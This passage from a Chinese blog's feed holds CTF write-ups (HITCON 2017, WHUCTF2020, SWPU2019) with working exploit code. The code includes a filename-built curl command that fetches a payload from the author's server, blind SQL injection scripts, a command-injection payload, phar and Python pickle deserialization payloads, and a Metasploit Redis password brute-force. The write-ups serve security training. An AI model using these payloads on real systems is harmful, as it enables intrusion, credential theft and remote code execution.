&lt;p&gt;我们在原文可以看到，作者通过了创建文件，利用文件名构造curl命令，然后用ls命令追加到一个文件，再用sh命令去执行它&lt;/p&gt;
&lt;p&gt;思路显然是非常的爆炸，但是我经过复现之后，发现这种构造很困难，作者利用了IP的16进制、8进制和长整型形式来构造文件名，而且分割之后恰恰又是满足alphabet的，而VPS的ip是固定不变的，想要找一个这样的IP需要一定的巧合。&lt;/p&gt;
&lt;p&gt;并且原作者playload的到数第三行：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170902.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;利用了A文件本身就在ls命令回显的特性，我构造到这里，很难受，这个技巧太高。&lt;/p&gt;
&lt;h4 id=&#34;ls--t--rev---命令结合使用回避alphabet&#34;&gt;ls -t 、 rev 、 * 命令结合使用回避alphabet&lt;/h4&gt;
&lt;p&gt;而在HITCON2017的四字版本里面，有师傅利用 &lt;code&gt;ls -t&lt;/code&gt; 和 &lt;code&gt;rev&lt;/code&gt; 和 &lt;code&gt;*&lt;/code&gt; 避开了这个问题，不过思路也是相当的巧妙&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import requests
import time

host = &#39;127.0.0.1&#39;

playload = [
 # generate &amp;quot;g&amp;gt; ht- sl&amp;quot; to file &amp;quot;v&amp;quot;
    &#39;&amp;gt;dir&#39;,
    &#39;&amp;gt;g\&amp;gt;&#39;,
    &#39;&amp;gt;ht-&#39;,
    &#39;&amp;gt;sl&#39;,
    &#39;*&amp;gt;v&#39;,
 # reverse file &amp;quot;v&amp;quot; to file &amp;quot;h&amp;quot;, content &amp;quot;ls -th &amp;gt;g&amp;quot;
    &#39;&amp;gt;rev&#39;,
    &#39;*v&amp;gt;h&#39;,
  # generate &amp;quot;curl 59.xx0.x5x.4&amp;gt;p.php&amp;quot;
    &#39;&amp;gt;\;\\&#39;,
    &#39;&amp;gt;p&#39;,
    &#39;&amp;gt;ph\\&#39;,
    &#39;&amp;gt;p.\\&#39;,
    &#39;&amp;gt;\&amp;gt;\\&#39;,
    &#39;&amp;gt;4\\&#39;,
    &#39;&amp;gt;5x.\\&#39;,
    &#39;&amp;gt;0.x\\&#39;,
    &#39;&amp;gt;xx\\&#39;,
    &#39;&amp;gt;59.\\&#39;,
    &#39;&amp;gt;\ \\&#39;,
    &#39;&amp;gt;rl\\&#39;,
    &#39;&amp;gt;cu\\&#39;,
    &#39;sh h&#39;,
    &#39;sh g&#39;,
]

for i in playload:
    cmd = i
    r = requests.get(host + &#39;?cmd=&#39; + i)
    #print(r.text)
    time.sleep(0.2)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这是5字版本的exp，4字版本只需要改一下自己的IP。&lt;/p&gt;
&lt;p&gt;其中 &lt;code&gt;*&lt;/code&gt; 这个命令很有意思&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170912.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;所以这个方案明显比原来的利用alphabet的排序来写shell好多了&lt;/p&gt;
</description>
        </item>
        <item>
        <title>WHUCTF2020</title>
        <link>https://anthem-whisper.github.io/p/whuctf2020/</link>
        <pubDate>Sun, 24 May 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/whuctf2020/</guid>
        <description>&lt;img src="https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170745.jpeg" alt="Featured image of post WHUCTF2020" /&gt;&lt;p&gt;武汉大学的CTF，难的简单的都有，最近比赛是真滴多，打完金盆洗手了&lt;/p&gt;
&lt;hr&gt;
&lt;h3 id=&#34;easy_sqli&#34;&gt;Easy_sqli&lt;/h3&gt;
&lt;p&gt;考点：bool盲注，双写绕过&lt;/p&gt;
&lt;p&gt;简单，没啥好讲的&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#wh1sper
import requests
host = &#39;http://218.197.154.9:10011/login.php#&#39;
def mid(bot, top):
    return (int)(0.5 * (top + bot))
def sqli():
    name = &#39;&#39;
    for j in range(1, 250):
        top = 126
        bot = 32
        while 1:
            babyselect = &#39;(seselectlect f111114g frfromom f1ag_y0u_wi1l_n3ver_kn0w)&#39;#
            select = &amp;quot;1&#39; oorr ascii(substr(&amp;quot;+babyselect+&amp;quot;,{},1))&amp;gt;{} #&amp;quot;.format(j, mid(bot, top))
            data = {&amp;quot;user&amp;quot;: select, &amp;quot;pass&amp;quot;: &amp;quot;a&amp;quot;}
            r = requests.post(url=host, data=data)
            #print(data)
            if &#39;Login success!&#39; in r.text:  # 成功
                if top - 1 == bot:  # top和bot相邻，说明name是top
                    name += chr(top)
                    print(name)
                    break
                bot = mid(bot, top)  # 成功就上移bot
            else:  # 失败
                if top - 1 == bot:  # top和bot相邻，加上失败，说明name是bot
                    name += chr(bot)
                    print(name)
                    break
                top = mid(bot, top)  # 失败就下移top
if __name__ == &#39;__main__&#39;:
    sqli()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;WHUCTF{r3lly_re11y_n0t_d1ffIcult_yet??~}&lt;/p&gt;
&lt;h3 id=&#34;ezphp&#34;&gt;ezphp&lt;/h3&gt;
&lt;p&gt;考点：%0a绕过preg_match、md5爆破、反序列化字符逃逸&lt;/p&gt;
&lt;p&gt;都是原题：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
error_reporting(0);
highlight_file(__file__);
$string_1 = $_GET[&#39;str1&#39;];
$string_2 = $_GET[&#39;str2&#39;];

//1st
if($_GET[&#39;num&#39;] !== &#39;23333&#39; &amp;amp;&amp;amp; preg_match(&#39;/^23333$/&#39;, $_GET[&#39;num&#39;])){
    echo &#39;1st ok&#39;.&amp;quot;&amp;lt;br&amp;gt;&amp;quot;;
}
else{
    die(&#39;会代码审计嘛23333&#39;);
}


//2nd
if(is_numeric($string_1)){
    $md5_1 = md5($string_1);
    $md5_2 = md5($string_2);

    if($md5_1 != $md5_2){
        $a = strtr($md5_1, &#39;pggnb&#39;, &#39;12345&#39;);
        $b = strtr($md5_2, &#39;pggnb&#39;, &#39;12345&#39;);
        if($a == $b){
            echo &#39;2nd ok&#39;.&amp;quot;&amp;lt;br&amp;gt;&amp;quot;;
        }
        else{
            die(&amp;quot;can u give me the right str???&amp;quot;);
        }
    } 
    else{
        die(&amp;quot;no!!!!!!!!&amp;quot;);
    }
}
else{
    die(&#39;is str1 numeric??????&#39;);
}

//3nd
function filter($string){
    return preg_replace(&#39;/x/&#39;, &#39;yy&#39;, $string);
}

$username = $_POST[&#39;username&#39;];

$password = &amp;quot;aaaaa&amp;quot;;
$user = array($username, $password);

$r = filter(serialize($user));
if(unserialize($r)[1] == &amp;quot;123456&amp;quot;){
    echo file_get_contents(&#39;flag.php&#39;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;第一关，num=23333%0a，NCTF和MRCTF出现过&lt;/p&gt;
&lt;p&gt;第二关，见本站&lt;a class=&#34;link&#34; href=&#34;http://wh1sper.com/%e5%b8%b8%e8%a7%810e%e5%bc%80%e5%a4%b4%e7%9a%84md5/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;奇怪的MD5&lt;/a&gt;，理解strtr的功能，exp跑1分钟出，md5(11230178)=0e732639146814822596b49bb6939b97&lt;/p&gt;
&lt;p&gt;第三关，反序列化字符逃逸，参考&lt;a class=&#34;link&#34; href=&#34;http://wh1sper.com/minil2020_web_wp/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;miniLCTF&lt;/a&gt;、&lt;a class=&#34;link&#34; href=&#34;http://wh1sper.com/fakephp%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%ad%97%e7%ac%a6%e9%80%83%e9%80%b8/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;安恒4月赛&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170758.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;h3 id=&#34;ezcmd&#34;&gt;ezcmd&lt;/h3&gt;
&lt;p&gt;考点：$IFS绕空格，\分割关键字，变量绕过flag匹配&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
if(isset($_GET[&#39;ip&#39;])){
  $ip = $_GET[&#39;ip&#39;];
  if(preg_match(&amp;quot;/\&amp;amp;|\/|\?|\*|\&amp;lt;|[\x{00}-\x{1f}]|\&amp;gt;|\&#39;|\&amp;quot;|\\|\(|\)|\[|\]|\{|\}/&amp;quot;, $ip, $match)){
    echo preg_match(&amp;quot;/\&amp;amp;|\/|\?|\*|\&amp;lt;|[\x{00}-\x{20}]|\&amp;gt;|\&#39;|\&amp;quot;|\\|\(|\)|\[|\]|\{|\}/&amp;quot;, $ip, $match);
    die(&amp;quot;fxck your symbol!&amp;quot;);
  } else if(preg_match(&amp;quot;/ /&amp;quot;, $ip)){
    die(&amp;quot;no space!&amp;quot;);
  } else if(preg_match(&amp;quot;/.*f.*l.*a.*g.*/&amp;quot;, $ip)){
    die(&amp;quot;no flag&amp;quot;);
  } else if(preg_match(&amp;quot;/tac|rm|echo|cat|nl|less|more|tail|head/&amp;quot;, $ip)){
    die(&amp;quot;cat&#39;t read flag&amp;quot;);
  }
  $a = shell_exec(&amp;quot;ping -c 4 &amp;quot;.$ip); 
  echo &amp;quot;&amp;lt;pre&amp;gt;&amp;quot;;
  print_r($a);
}
highlight_file(__FILE__);

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;参考：https://cloud.tencent.com/developer/article/1599149&lt;/p&gt;
&lt;p&gt;playload:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?ip=0.0.0.0;a=g;b=fla;ca\t$IFS$b$a.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;whuctf{11041f3d-3fbb-4dfd-8f27-31788300b54c}&lt;/p&gt;
&lt;h3 id=&#34;ezinclude&#34;&gt;ezinclude&lt;/h3&gt;
&lt;p&gt;考点：文件包含参数爆破&lt;/p&gt;
&lt;p&gt;打开题目，扫目录到了info.php，本来以为是临时文件包含，结果。。&lt;/p&gt;
&lt;p&gt;在contact.php提交表单，跳转到/thankyou.php，里面看到了几个参数，直接爆破出file参数，&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;file=php://filter/read=convert.base64-encode/resource=flag.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;得到base64编码的flag&lt;/p&gt;
&lt;p&gt;whuctf{N0w_y0u_kn0w_file_inclusion}&lt;/p&gt;
&lt;h3 id=&#34;easy_unserialize&#34;&gt;Easy_unserialize&lt;/h3&gt;
&lt;p&gt;考点：文件包含、Phar反序列化&lt;/p&gt;
&lt;p&gt;phar学习链接&lt;/p&gt;
&lt;p&gt;&amp;gt;&amp;gt;https://www.freebuf.com/column/198945.html&lt;/p&gt;
&lt;p&gt;&amp;gt;&amp;gt;https://paper.seebug.org/680/&lt;/p&gt;
&lt;p&gt;题目名称是unserialize，不过打开却是一个文件上传页面，上传和反序列化结合的我只能想到phar反序列化，但是由于以前做题直接跳过了这个知识点，不够熟悉，比赛的时候出了一点小故障没做出来。&lt;/p&gt;
&lt;p&gt;在主页的源码里面可以看到提示 &lt;code&gt;&amp;lt;!-- flag.php --&amp;gt;&lt;/code&gt; ，分别访问 &lt;code&gt;upload.php&lt;/code&gt; 和 &lt;code&gt;view.php&lt;/code&gt; 然后回头看抓包，发现了有一个 &lt;code&gt;acti0n=upload&lt;/code&gt; 和 &lt;code&gt;acti0n=view&lt;/code&gt; 的302重定向，放到bp，用伪协议可以读取两个页面的源码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?acti0n=pHp://Filter/read=convert.Base64-encode/resource=upload.php
?acti0n=pHp://Filter/read=convert.Base64-encode/resource=view.php
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注意他过滤了一些关键字，需要大小写绕过。&lt;/p&gt;
&lt;p&gt;得到了源码之后就是审计了，在 &lt;code&gt;upload.php&lt;/code&gt; 里面也能看到这样一段：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;if(preg_match(&#39;/(png)|(jpg)|(jpeg)|(phar)|(gif)|(txt)|(md)|(exe)/i&#39;, $extension) === 0) {
  die(&amp;quot;&amp;lt;p align=\&amp;quot;center\&amp;quot;&amp;gt;You can&#39;t upload this kind of file!&amp;lt;/p&amp;gt;&amp;quot;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;也间接（直接）暗示（明示）了我们phar的操作。&lt;/p&gt;
&lt;p&gt;在view.php里面看到：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;if (isset($_POST[&#39;show&#39;])) {
  $file_name = $_POST[&#39;show&#39;];
  $ins-&amp;gt;show_img($file_name);
}
if (isset($_POST[&#39;delete&#39;])) {
  $file_name = $_POST[&#39;delete&#39;];
  $ins-&amp;gt;delete_img($file_name);
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;转到声明：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;  class View
  {
    public $dir;
    private $cmd;
    …………
    …………
    function show_img($file_name) {
      $name = $file_name;
      $width = getimagesize($name)[0];
      $height = getimagesize($name)[1];
      $times = $width / 200;
      $width /= $times;
      $height /= $times;
      $template = &amp;quot;
&amp;lt;img style=\&amp;quot;clear: both;display: block;margin: auto;\&amp;quot; src=\&amp;quot;$this-&amp;gt;dir$name\&amp;quot; 
alt=\&amp;quot;$file_name\&amp;quot; width = \&amp;quot;$width\&amp;quot; height = \&amp;quot;$height\&amp;quot;&amp;gt;
      &amp;quot;;
      echo $template;
    }

    function delete_img($file_name) {
      $name = $file_name;
      if (file_exists($name)) {
        @unlink($name);
        if(!file_exists($name)) {
          echo &amp;quot;&amp;lt;p align=\&amp;quot;center\&amp;quot; style=\&amp;quot;font-weight: bold;\&amp;quot;&amp;gt;成功删除! 3s后跳转&amp;lt;/p&amp;gt;&amp;quot;;
          header(&amp;quot;refresh:3;url=view.php&amp;quot;);
        } else {
          echo &amp;quot;Can not delete!&amp;quot;;
          exit;
        }
      } else {
        echo &amp;quot;&amp;lt;p align=\&amp;quot;center\&amp;quot; style=\&amp;quot;font-weight: bold;\&amp;quot;&amp;gt;找不到这个文件! &amp;lt;/p&amp;gt;&amp;quot;;
      }
    }

    function __destruct() {
      eval($this-&amp;gt;cmd);
    }
  }
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;function delete_img&lt;/code&gt; 里面有 &lt;code&gt;file_exists()&lt;/code&gt; 可以触发phar反序列化，那么我们就开始构造phar文件：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
class View
{
    public $dir;
    private $cmd = &#39;show_source(&amp;quot;/var/www/html/flag.php&amp;quot;);&#39;;
}
@unlink(&amp;quot;phar.phar&amp;quot;);
$phar = new Phar(&amp;quot;phar.phar&amp;quot;); //后缀名必须为phar
$phar-&amp;gt;startBuffering();
$phar-&amp;gt;setStub(&amp;quot;GIF89a&amp;quot;.&amp;quot;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;quot;); //设置stub
$o = new view();
$phar-&amp;gt;setMetadata($o); //将自定义的meta-data存入manifest
$phar-&amp;gt;addFromString(&amp;quot;test.jpg&amp;quot;, &amp;quot;test&amp;quot;); //添加要压缩的文件
//签名自动计算
$phar-&amp;gt;stopBuffering();
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;由于upload里面ban了一些函数，题目又提示了flag.php，我们就直接show_source&lt;/p&gt;
&lt;p&gt;运行，生成phar文件，上传。&lt;/p&gt;
&lt;p&gt;在 &lt;code&gt;view.php&lt;/code&gt; POST请求：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;delete=phar://phar.phar
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;直接得到flag.php的源码&lt;/p&gt;
&lt;p&gt;WHUCTF{Phar_1s_Very_d@nger0u5}&lt;/p&gt;
</description>
        </item>
        <item>
        <title>SWPU2019 复现</title>
        <link>https://anthem-whisper.github.io/p/swpu2019-%E5%A4%8D%E7%8E%B0/</link>
        <pubDate>Mon, 18 May 2020 00:00:00 +0000</pubDate>
        
        <guid>https://anthem-whisper.github.io/p/swpu2019-%E5%A4%8D%E7%8E%B0/</guid>
        <description>&lt;h3 id=&#34;web2httpsbuuojcnchallengesswpu2019web2&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;https://buuoj.cn/challenges#[SWPU2019]Web2&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Web2&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;考点：redis弱口令，python反序列化&lt;/p&gt;
&lt;p&gt;BUU上面的环境需要 Shadowsocks 代理才能访问，配置这个都搞了半天（tcl&lt;/p&gt;
&lt;h4 id=&#34;下载配置shadowsocks&#34;&gt;下载配置shadowsocks&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;sudo apt-get install shadowsocks
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;连接代理&#34;&gt;连接代理&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;sslocal -s node3.buuoj.cn -p 11111 -k 123456
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;报错：AttributeError: /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1: undefined symbol: EVP_CIPHER_CTX_cleanup&lt;/p&gt;
&lt;p&gt;报错参考：https://www.jianshu.com/p/3f874d5aac54&lt;/p&gt;
&lt;p&gt;在Python2.7中的openssl文件中,下面这个函数没有定义,具体就是这个:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;EVP_CIPHER_CTX_cleanup
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;更深层的是是由于在openssl1.1.0版本中，废弃了 &lt;code&gt;EVP_CIPHER_CTX_cleanup&lt;/code&gt; 函数,要用这个函数 &lt;code&gt;EVP_CIPHER_CTX_reset()&lt;/code&gt; 代替;&lt;/p&gt;
&lt;p&gt;直接 &lt;code&gt;vim /usr/local/lib/python2.7/dist-packages/shadowsocks/crypto/openssl.py&lt;/code&gt; 打开文件，全局搜索关键字替换即可；&lt;/p&gt;
&lt;h4 id=&#34;kali下编译安装proxychains4&#34;&gt;kali下编译安装proxychains4&lt;/h4&gt;
&lt;h5 id=&#34;编译安装&#34;&gt;编译安装&lt;/h5&gt;
&lt;pre&gt;&lt;code&gt;git clone https://github.com/rofl0r/proxychains-ng.git  # download
cd proxychains-ng
./configure
sudo make 
sudo make install
cp ./src/proxychains.conf /etc/proxychains.conf  # config file
&lt;/code&gt;&lt;/pre&gt;&lt;h5 id=&#34;用proxychains做正向代理&#34;&gt;用proxychains做正向代理&lt;/h5&gt;
&lt;pre&gt;&lt;code&gt;vim /etc/proxychains.conf
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;添加一行：socks5 127.0.0.1 1080（具体取决于你的ss配置的端口）&lt;/p&gt;
&lt;p&gt;不过我这里需要注释掉原来的那一行 &lt;code&gt;socks4 127.0.0.1 9050&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;命令行访问内网&#34;&gt;命令行访问内网&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;proxychains4 ping web 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;只需在前面加 &lt;code&gt;proxychains4&lt;/code&gt; 就行了&lt;/p&gt;
&lt;h4 id=&#34;浏览器访问内网&#34;&gt;浏览器访问内网&lt;/h4&gt;
&lt;p&gt;浏览器配置浏览器代理，选择Sock5，ip设为127.0.0.1，端口设为默认的1080。&lt;/p&gt;
&lt;p&gt;然后我们用浏览器访问http://web:2333/，注册登录之后在源码里面发现 &lt;code&gt;redis&lt;/code&gt; 字样提示，得知是redis，用命令行访问&lt;/p&gt;
&lt;p&gt;proxychains4 redis-cli -h web -p 6379&lt;/p&gt;
&lt;p&gt;发现执行命令需要密码，我们用msf的模块爆破之：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo proxychains4 msfconsole
search redis
use auxiliary/scanner/redis/redis_login
set rhosts web
set rport 6379
exploit
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;得到密码：&lt;code&gt;password&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;于是可以查看数据：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170641.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;我看到了自己的session，发现是python序列化之后的数据，我们访问的时候他会对这个数据进行反序列化
如果我们控制了这个数据，那么可以利用反序列化来进行getshell
对python不是很熟悉，网上找到exp改一改：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python
import cPickle
import os
import redis
class exp(object):
    def __reduce__(self):
        s = &amp;quot;ls / &amp;gt; ./static/js/materialize.min.js&amp;quot;
        #执行命令，外带到一个js文件，弹shell是不可以的，BUU内网都不可以，折腾了好久
        return (os.system, (s,))
e = exp()
s = cPickle.dumps(e)
r = redis.Redis(host=&#39;web&#39;,password=&amp;quot;password&amp;quot;, port=6379, db=0)
r.set(&amp;quot;session:1ea713bb-ad84-489b-b48b-1ba3f07b7ecb&amp;quot;, s)#这里需要改为自己的session
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;运行 &lt;code&gt;proxychains4 python exp.py&lt;/code&gt; 命令之后，我们可以在redis的终端看到我们的session
已经被改为我们恶意的序列化结果了，再次访问http://web:2333/输入用户名密码登陆后
就可以在/static/js/materialize.min.js文件中看到我们命令执行结果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120170726.png&#34; alt=&#34;img&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;flag{b13534e2-8984-4f59-a46f-1f8eac316899}&lt;/p&gt;
&lt;h3 id=&#34;web3httpsbuuojcnchallengesswpu2019web3&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;https://buuoj.cn/challenges#[SWPU2019]Web3&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;web3&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;考点：flask session伪造，软连接读取flag，命令注入&lt;/p&gt;
&lt;p&gt;请见&lt;a class=&#34;link&#34; href=&#34;http://wh1sper.com/buuoj%e5%88%b7%e9%a2%98%e8%ae%b0%e5%bd%953/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;BUU刷题记录3&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;web4httpsbuuojcnchallengesswpu2019web4&#34;&gt;&lt;a class=&#34;link&#34; href=&#34;https://buuoj.cn/challenges#[SWPU2019]Web4&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;web4&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;考点：PDO场景下的堆叠注入、时间盲注&lt;/p&gt;
&lt;p&gt;打开题目叫你登录，不过任凭你怎么登录都会没有反应，注册说“未开放注册功能”&lt;/p&gt;
&lt;p&gt;回头一抓包，发现我们向 &lt;code&gt;/index.php?r=Login/Login&lt;/code&gt; 发送了一个数据包，这里可以注入，POST输入：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{&amp;quot;username&amp;quot;:&amp;quot;1&#39;&amp;quot;,&amp;quot;password&amp;quot;:&amp;quot;123&amp;quot;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;页面会报错，但是我们输入：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{&amp;quot;username&amp;quot;:&amp;quot;1&#39;;&amp;quot;,&amp;quot;password&amp;quot;:&amp;quot;123&amp;quot;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;页面却没报错，同时说密码错误；&lt;/p&gt;
&lt;p&gt;那么说明这道题可以堆叠注入。&lt;/p&gt;
&lt;p&gt;尝试 &lt;code&gt;1&#39;;show databases;&lt;/code&gt; 之类的操作，一直显示密码错误，猜测可能关键字被waf了，因为是堆叠，我们可以参考新春战疫的一道堆叠注入（当时也是PDO），使用预编译+16进制编码绕过waf。&lt;/p&gt;
&lt;p&gt;而且页面不会根据我们输入情况回显不同，那么就用时间盲注；&lt;/p&gt;
&lt;p&gt;exp：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# by wh1sper
# 时间盲注
import requests
import time
 
host = &#39;http://fe683617-4ef1-4c6a-8332-febe7058c07e.node3.buuoj.cn/index.php?r=Login/Login&#39;
 
 
def mid(bot, top):
    return (int)(0.5 * (top + bot))
 
def char_to_hex(str):
    res = &#39;&#39;
    for i in str:
        res += hex(ord(i))
    res = &#39;0x&#39; + res.replace(&#39;0x&#39;, &#39;&#39;)
    return res
 
 
def sqli():
    name = &#39;&#39;
    for j in range(1, 250):
        top = 126
        bot = 32
        while 1:
            #babyselect = &#39;database()&#39;#---&amp;gt;ctf
            #babyselect = &#39;(select group_concat(table_name) &#39; \
            #             &#39;from information_schema.tables where table_schema=database())&#39;#---flag
            # babyselect = &#39;(select group_concat(column_name) &#39; \
            #             &#39;from information_schema.columns where table_name=&#39;flag&#39;)&#39;#---&amp;gt;flag
            babyselect = &#39;(select flag from flag)&#39;#---&amp;gt;glzjin_wants_a_girl_friend.zip
            select = &amp;quot;select if((ascii(substr(&amp;quot; +babyselect+ &amp;quot;,{},1))&amp;gt; {}),sleep(3),1);&amp;quot;\
                .format(j, mid(bot, top))
            playload = &amp;quot;1&#39;;set @a=&amp;quot;+ char_to_hex(select) +&amp;quot;;PREPARE test from @a;execute test;&amp;quot;
 
            data = {
                &amp;quot;username&amp;quot;: playload,
                &amp;quot;password&amp;quot;: &amp;quot;1&amp;quot;
            }
            print(mid(bot, top))
            start_time = time.time()
            r = requests.post(url=host, json=data)
            end_tmie = time.time()
            #print(r.text)
            if end_tmie - start_time &amp;gt; 1.5:  # 成功
                if top - 1 == bot:  # top和bot相邻，说明name是top
                    name += chr(top)
                    print(name)
                    break
                bot = mid(bot, top)  # 成功就上移bot
            else:  # 失败
                if top - 1 == bot:  # top和bot相邻，加上失败，说明name是bot
                    name += chr(bot)
                    print(name)
                    break
                top = mid(bot, top)  # 失败就下移top
 
 
if __name__ == &#39;__main__&#39;:
    sqli()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;得到：glzjin_wants_a_girl_friend.zip&lt;/p&gt;
&lt;p&gt;然后看的出来是个文件，访问下载之，得到网站源码。
很明显，我们要通过某种方法将flag.php中的文件内容给读取出来。&lt;/p&gt;
&lt;p&gt;这是个MVC模型，首先了解一下该框架下url的解析过程：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;从r参数中获取要访问的 &lt;code&gt;Controller&lt;/code&gt; 以及 &lt;code&gt;Action&lt;/code&gt; ,然后以 &lt;code&gt;/&lt;/code&gt; 分隔开后拼接成完整的控制器名。
以 &lt;code&gt;Login/Index&lt;/code&gt; 为例，就是将 &lt;code&gt;Login/Index&lt;/code&gt; 分隔开分别拼接成 &lt;code&gt;LoginController&lt;/code&gt; 以及 &lt;code&gt;actionIndex&lt;/code&gt; ,然后调用 &lt;code&gt;LoginController&lt;/code&gt;
这个类中的 &lt;code&gt;actionIndex&lt;/code&gt; 方法。每个 &lt;code&gt;action&lt;/code&gt; 里面会调用对应的 &lt;code&gt;loadView()&lt;/code&gt; 方法进行模版渲染，然后将页面返回给客户端。
若访问的 &lt;code&gt;Controller&lt;/code&gt; 不存在则默认解析 &lt;code&gt;Login/Index&lt;/code&gt; 。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这样我们就应该先来审计控制器的代码。&lt;/p&gt;
&lt;p&gt;不难发现，在BaseController中有着这么一段明显有问题的代码&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public function loadView($viewName =&#39;&#39;, $viewData = [])
{
    $this-&amp;gt;viewPath = BASE_PATH . &amp;quot;/View/{$viewName}.php&amp;quot;;
    if(file_exists($this-&amp;gt;viewPath))
    {
        extract($viewData);
        include $this-&amp;gt;viewPath;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这段代码中使用了 &lt;code&gt;extract()&lt;/code&gt; ，以及包含了 &lt;code&gt;/View/{$viewName}.php&lt;/code&gt; ，也就是说我们能通过 &lt;code&gt;$viewName&lt;/code&gt; 和 &lt;code&gt;$viewData&lt;/code&gt; 这两个变量来更改 &lt;code&gt;/View&lt;/code&gt; 下任何一个php文件的任何一个变量的值。&lt;/p&gt;
&lt;p&gt;在UserController中找到了以下代码:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public function actionIndex()
{
    $listData = $_REQUEST;
    $this-&amp;gt;loadView(&#39;userIndex&#39;,$listData);
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以看出来，其中 &lt;code&gt;$listData&lt;/code&gt; 是从请求中获取，用户可控，而其对应的 &lt;code&gt;/View/userIndex.php&lt;/code&gt; 中存在一个文件读取：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;div class=&amp;quot;fakeimg&amp;quot;&amp;gt;&amp;lt;?php
    if(!isset($img_file)) {
        $img_file = &#39;/../favicon.ico&#39;;
    }
    $img_dir = dirname(__FILE__) . $img_file;
    $img_base64 = imgToBase64($img_dir);
    echo &#39;&amp;lt;img src=&amp;quot;&#39; . $img_base64 . &#39;&amp;quot;&amp;gt;&#39;;       //图片形式展示
    ?&amp;gt;&amp;lt;/div&amp;gt;
